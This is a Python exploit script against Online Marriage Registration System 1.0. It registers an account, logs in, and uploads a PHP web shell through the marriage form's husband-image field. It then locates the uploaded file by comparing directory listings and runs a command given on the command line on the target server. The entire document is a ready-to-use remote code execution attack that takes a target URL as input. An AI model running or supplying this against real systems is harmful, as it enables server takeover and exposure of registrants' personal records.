import os
import sys
import random
import argparse
import requests


def get_args():
    parser = argparse.ArgumentParser()
    parser.add_argument('-u', '--url', required=True, action='store', help='Url of Online Marriage Registration System (OMRS) 1.0')
    parser.add_argument('-c', '--command', required=True, action='store', help='Command to execute')
    parser.add_argument('-m', '--mobile', required=False, action='store', help='Mobile phone used for registration')
    parser.add_argument('-p', '--password', required=False, action='store', help='Password used for registration')
    my_args = parser.parse_args()
    return my_args


def login(url, mobile, password):
    url = "%s/user/login.php"%(url)
    payload = {'mobno':mobile, 'password':password, 'login':''}
    req = requests.post(url, data=payload)
    return req.cookies['PHPSESSID']


def upload(url, cookie, file=None):
    url = "%s/user/marriage-reg-form.php"%url
    files = {'husimage': ('shell.php', "<?php $command = shell_exec($_REQUEST['cmd']); echo $command; ?>", 'application/x-php', {'Expires': '0'}), 'wifeimage':('test.jpg','','image/jpeg')}
    payload = {'dom':'05/01/2020','nofhusband':'omrs_rce', 'hreligion':'omrs_rce', 'hdob':'05/01/2020','hsbmarriage':'Bachelor','haddress':'omrs_rce','hzipcode':'omrs_rce','hstate':'omrs_rce','hadharno':'omrs_rce','nofwife':'omrs_rce','wreligion':'omrs_rce','wsbmarriage':'Bachelor','waddress':'omrs_rce','wzipcode':'omrs_rce','wstate':'omrs_rce','wadharno':'omrs_rce','witnessnamef':'omrs_rce','waddressfirst':'omrs_rce','witnessnames':'omrs_rce','waddresssec':'omrs_rce','witnessnamet':'omrs_rce','waddressthird':'omrs_rce','submit':''}
    req = requests.post(url, data=payload, cookies={'PHPSESSID':cookie}, files=files)
    print('[+] PHP shell uploaded')


def get_remote_php_files(url):
    url = "%s/user/images"%(url)
    req = requests.get(url)
    php_files = []
    for i in req.text.split(".php"):
        php_files.append(i[-42:])
    return php_files


def exec_command(url, webshell, command):
    url_r = "%s/user/images/%s?cmd=%s"%(url, webshell, command)
    req = requests.get(url_r)
    print("[+] Command output\n%s"%(req.text))


def register(mobile, password, url):
    url_r = "%s/user/signup.php"%(url)
    data = {"fname":"omrs_rce", "lname":"omrs_rce", "mobno":mobile, "address":"omrs_rce", "password":password, "submit":""}
    req = requests.post(url_r, data=data)
    print("[+] Registered with mobile phone %s and password '%s'"%(mobile,password))


if __name__ == "__main__":
    args = get_args()
    url = args.url
    command = args.command
    mobile = str(random.randint(100000000,999999999)) if args.mobile is None else args.mobile
    password = "dante123" if args.password is None else args.password
    if args.password is None or args.mobile is None:
        register(mobile,password,url)
    cookie = login(url, mobile, password)
    initial_php_files = get_remote_php_files(url)
    upload(url, cookie)
    final_php_files = get_remote_php_files(url)
    webshell = (list(set(final_php_files) - set(initial_php_files))[0]+".php")
    exec_command(url,webshell,command)